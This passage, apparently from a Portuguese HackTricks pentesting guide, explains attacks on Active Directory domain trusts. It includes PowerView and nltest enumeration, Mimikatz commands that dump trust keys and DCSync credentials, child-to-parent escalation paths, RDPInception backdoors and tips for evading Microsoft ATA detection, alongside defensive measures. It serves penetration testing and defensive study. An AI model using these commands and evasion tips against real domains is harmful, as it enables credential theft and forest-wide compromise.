- **MIT Trusts**: Essas trusts são estabelecidas com domínios Kerberos não-Windows, compatíveis com [RFC4120](https://tools.ietf.org/html/rfc4120). MIT trusts são um pouco mais especializadas e atendem ambientes que exigem integração com sistemas baseados em Kerberos fora do ecossistema Windows.

#### Other differences in **trusting relationships**

- Uma relação de trust também pode ser **transitive** (A confia em B, B confia em C, então A confia em C) ou **non-transitive**.
- Uma relação de trust pode ser configurada como **bidirectional trust** (ambos confiam um no outro) ou como **one-way trust** (apenas um confia no outro).

### Attack Path

1. **Enumerar** as relações de trusting
2. Verificar se algum **security principal** (user/group/computer) tem **acesso** a recursos do **outro domínio**, talvez por entradas ACE ou por estar em grupos do outro domínio. Procure por **relações entre domínios** (a trust foi criada para isso provavelmente).
1. kerberoast neste caso poderia ser outra opção.
3. **Comprometer** as **contas** que podem **pivotar** através dos domínios.

Atacantes podem acessar recursos em outro domínio através de três mecanismos primários:

- **Local Group Membership**: Principals podem ser adicionados a grupos locais em máquinas, como o grupo “Administrators” em um servidor, concedendo-lhes controle significativo sobre essa máquina.
- **Foreign Domain Group Membership**: Principals também podem ser membros de grupos dentro do domínio estrangeiro. Contudo, a eficácia desse método depende da natureza da trust e do escopo do grupo.
- **Access Control Lists (ACLs)**: Principals podem ser especificados em uma **ACL**, particularmente como entidades em **ACEs** dentro de uma **DACL**, fornecendo-lhes acesso a recursos específicos. Para quem quiser se aprofundar na mecânica de ACLs, DACLs e ACEs, o whitepaper “[An ACE Up The Sleeve](https://specterops.io/assets/resources/an_ace_up_the_sleeve.pdf)” é um recurso inestimável.

### Find external users/groups with permissions

Você pode checar **`CN=<user_SID>,CN=ForeignSecurityPrincipals,DC=domain,DC=com`** para encontrar foreign security principals no domínio. Estes serão usuários/grupos de **um domínio/forest externo**.

Você pode checar isso no **Bloodhound** ou usando powerview:
```powershell
# Get users that are i groups outside of the current domain
Get-DomainForeignUser

# Get groups inside a domain with users our
Get-DomainForeignGroupMember
```
### Child-to-Parent forest privilege escalation
```bash
# Fro powerview
Get-DomainTrust

SourceName      : sub.domain.local    --> current domain
TargetName      : domain.local        --> foreign domain
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : WITHIN_FOREST       --> WITHIN_FOREST: Both in the same forest
TrustDirection  : Bidirectional       --> Trust direction (2ways in this case)
WhenCreated     : 2/19/2021 1:28:00 PM
WhenChanged     : 2/19/2021 1:28:00 PM
```
Outras maneiras de enumerar trusts de domínio:
```bash
# Get DCs
nltest /dsgetdc:<DOMAIN>

# Get all domain trusts
nltest /domain_trusts /all_trusts /v

# Get all trust of a domain
nltest /dclist:sub.domain.local
nltest /server:dc.sub.domain.local /domain_trusts /all_trusts
```
> [!WARNING]
> Existem **2 trusted keys**, uma para _Child --> Parent_ e outra para _Parent_ --> _Child_.\
> Você pode identificar qual é usada pelo domínio atual com:
>
> ```bash
> Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dc.my.domain.local
> Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\mcorp$"'
> ```

#### SID-History Injection

Escalar para Enterprise admin no domínio child/parent abusando da trust com SID-History injection:


{{#ref}}
sid-history-injection.md
{{#endref}}

#### Exploit writeable Configuration NC

Entender como o Configuration Naming Context (NC) pode ser explorado é crucial. O Configuration NC funciona como um repositório central para dados de configuração em toda a forest em ambientes Active Directory (AD). Esses dados são replicados para todos os Domain Controllers (DC) dentro da forest, com DCs graváveis mantendo uma cópia gravável do Configuration NC. Para explorar isso, é necessário ter privilégios **SYSTEM em um DC**, preferencialmente um DC child.

**Vincular GPO ao site do root DC**

O container Sites do Configuration NC inclui informações sobre os sites de todos os computadores ingressados no domínio dentro da forest AD. Operando com privilégios SYSTEM em qualquer DC, atacantes podem vincular GPOs aos sites do root DC. Essa ação pode comprometer o domínio root ao manipular políticas aplicadas a esses sites.

Para informações detalhadas, pode-se consultar a pesquisa sobre [Bypassing SID Filtering](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-4-bypass-sid-filtering-research).

**Comprometer qualquer gMSA na forest**

Um vetor de ataque envolve mirar gMSAs privilegiadas dentro do domínio. A KDS Root key, essencial para calcular as senhas de gMSAs, é armazenada no Configuration NC. Com privilégios SYSTEM em qualquer DC, é possível acessar a KDS Root key e calcular as senhas de qualquer gMSA em toda a forest.

Análise detalhada e passo a passo podem ser encontrados em:


{{#ref}}
golden-dmsa-gmsa.md
{{#endref}}

Ataque complementar a MSA delegada (BadSuccessor – abusando de atributos de migração):


{{#ref}}
badsuccessor-dmsa-migration-abuse.md
{{#endref}}

Pesquisa externa adicional: [Golden gMSA Trust Attacks](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-5-golden-gmsa-trust-attack-from-child-to-parent).

**Schema change attack**

Esse método requer paciência, aguardando a criação de novos objetos AD privilegiados. Com privilégios SYSTEM, um atacante pode modificar o AD Schema para conceder a qualquer usuário controle completo sobre todas as classes. Isso pode levar a acesso não autorizado e controle sobre novos objetos AD criados.

Leitura adicional está disponível em [Schema Change Trust Attacks](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-6-schema-change-trust-attack-from-child-to-parent).

**From DA to EA with ADCS ESC5**

A vulnerabilidade ADCS ESC5 explora o controle sobre objetos de Public Key Infrastructure (PKI) para criar um template de certificado que permite autenticar como qualquer usuário dentro da forest. Como os objetos PKI residem no Configuration NC, comprometer um DC child gravável permite a execução de ataques ESC5.

Mais detalhes podem ser lidos em [From DA to EA with ESC5](https://posts.specterops.io/from-da-to-ea-with-esc5-f9f045aa105c). Em cenários sem ADCS, o atacante tem a capacidade de configurar os componentes necessários, conforme discutido em [Escalating from Child Domain Admins to Enterprise Admins](https://www.pkisolutions.com/escalating-from-child-domains-admins-to-enterprise-admins-in-5-minutes-by-abusing-ad-cs-a-follow-up/).

### Domínio de Forest Externa - One-Way (Inbound) ou bidirecional
```bash
Get-DomainTrust
SourceName      : a.domain.local   --> Current domain
TargetName      : domain.external  --> Destination domain
TrustType       : WINDOWS-ACTIVE_DIRECTORY
TrustAttributes :
TrustDirection  : Inbound          --> Inboud trust
WhenCreated     : 2/19/2021 10:50:56 PM
WhenChanged     : 2/19/2021 10:50:56 PM
```
Neste cenário, **seu domínio é confiável** por um domínio externo, concedendo-lhe **permissões indeterminadas** sobre ele. Você precisará descobrir **quais principals do seu domínio têm quais acessos sobre o domínio externo** e então tentar explorá-lo:


{{#ref}}
external-forest-domain-oneway-inbound.md
{{#endref}}

### Domínio de Floresta Externa - Unidirecional (Outbound)
```bash
Get-DomainTrust -Domain current.local

SourceName      : current.local   --> Current domain
TargetName      : external.local  --> Destination domain
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : FOREST_TRANSITIVE
TrustDirection  : Outbound        --> Outbound trust
WhenCreated     : 2/19/2021 10:15:24 PM
WhenChanged     : 2/19/2021 10:15:24 PM
```
Neste cenário **seu domínio** está **confiando** alguns **privilégios** a um principal de **domínios diferentes**.

No entanto, quando um **domínio é confiado** pelo domínio confiador, o domínio confiado **cria um usuário** com um **nome previsível** que usa como **senha a senha confiada**. O que significa que é possível **acessar um usuário do domínio confiador para entrar no domínio confiado** para enumerá-lo e tentar escalar mais privilégios:


{{#ref}}
external-forest-domain-one-way-outbound.md
{{#endref}}

Another way to compromise the trusted domain is to find a [**SQL trusted link**](abusing-ad-mssql.md#mssql-trusted-links) created in the **opposite direction** of the domain trust (which isn't very common).

Another way to compromise the trusted domain is to wait in a machine where a **user from the trusted domain can access** to login via **RDP**. Then, the attacker could inject code in the RDP session process and **access the origin domain of the victim** from there.\
Moreover, if the **victim mounted his hard drive**, from the **RDP session** process the attacker could store **backdoors** in the **startup folder of the hard drive**. This technique is called **RDPInception.**


{{#ref}}
rdp-sessions-abuse.md
{{#endref}}

### Mitigação de abuso de confiança de domínio

### **SID Filtering:**

- O risco de ataques que exploram o atributo SID history através de trusts entre florestas é mitigado pelo SID Filtering, que é ativado por padrão em todas as trusts entre florestas. Isso se baseia na suposição de que trusts intra-floresta são seguros, considerando a floresta, em vez do domínio, como o limite de segurança conforme a posição da Microsoft.
- No entanto, há um problema: o SID Filtering pode interromper aplicações e o acesso de usuários, levando à sua desativação ocasional.

### **Selective Authentication:**

- Para trusts entre florestas, empregar o Selective Authentication garante que usuários das duas florestas não sejam autenticados automaticamente. Em vez disso, permissões explícitas são necessárias para que usuários acessem domínios e servidores dentro do domínio ou floresta confiadora.
- É importante notar que essas medidas não protegem contra a exploração do Configuration Naming Context (NC) gravável nem contra ataques à conta de trust.

[**More information about domain trusts in ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)

## AD -> Azure & Azure -> AD


{{#ref}}
https://cloud.hacktricks.wiki/en/pentesting-cloud/azure-security/az-lateral-movement-cloud-on-prem/azure-ad-connect-hybrid-identity/index.html
{{#endref}}

## Algumas Defesas Gerais

[**Learn more about how to protect credentials here.**](../stealing-credentials/credentials-protections.md)

### **Defensive Measures for Credential Protection**

- **Domain Admins Restrictions**: Recomenda-se que Domain Admins só possam fazer login em Domain Controllers, evitando seu uso em outros hosts.
- **Service Account Privileges**: Serviços não devem ser executados com privilégios de Domain Admin (DA) para manter a segurança.
- **Temporal Privilege Limitation**: Para tarefas que requerem privilégios DA, sua duração deve ser limitada. Isso pode ser feito com: `Add-ADGroupMember -Identity ‘Domain Admins’ -Members newDA -MemberTimeToLive (New-TimeSpan -Minutes 20)`

### **Implementing Deception Techniques**

- Implementar enganação envolve armar armadilhas, como usuários ou computadores isca, com características como senhas que não expiram ou que são marcados como Trusted for Delegation. Uma abordagem detalhada inclui criar usuários com direitos específicos ou adicioná-los a grupos de alto privilégio.
- Um exemplo prático envolve usar ferramentas como: `Create-DecoyUser -UserFirstName user -UserLastName manager-uncommon -Password Pass@123 | DeployUserDeception -UserFlag PasswordNeverExpires -GUID d07da11f-8a3d-42b6-b0aa-76c962be719a -Verbose`
- More on deploying deception techniques can be found at [Deploy-Deception on GitHub](https://github.com/samratashok/Deploy-Deception).

### **Identifying Deception**

- **For User Objects**: Indicadores suspeitos incluem ObjectSID atípico, logons pouco frequentes, datas de criação e contagem baixa de senhas incorretas.
- **General Indicators**: Comparar atributos de objetos potenciais de enganação com os de objetos genuínos pode revelar inconsistências. Ferramentas como [HoneypotBuster](https://github.com/JavelinNetworks/HoneypotBuster) podem ajudar a identificar tais enganações.

### **Bypassing Detection Systems**

- **Microsoft ATA Detection Bypass**:
- **User Enumeration**: Evitar a enumeração de sessões em Domain Controllers para prevenir a detecção pelo ATA.
- **Ticket Impersonation**: Utilizar chaves **aes** para criação de tickets ajuda a evadir a detecção por não degradar para NTLM.
- **DCSync Attacks**: Recomenda-se executar a partir de um host que não seja Domain Controller para evitar a detecção pelo ATA, pois a execução direta de um Domain Controller disparará alertas.

## Referências

- [http://www.harmj0y.net/blog/redteaming/a-guide-to-attacking-domain-trusts/](http://www.harmj0y.net/blog/redteaming/a-guide-to-attacking-domain-trusts/)
- [https://www.labofapenetrationtester.com/2018/10/deploy-deception.html](https://www.labofapenetrationtester.com/2018/10/deploy-deception.html)
- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)

{{#include ../../banners/hacktricks-training.md}}
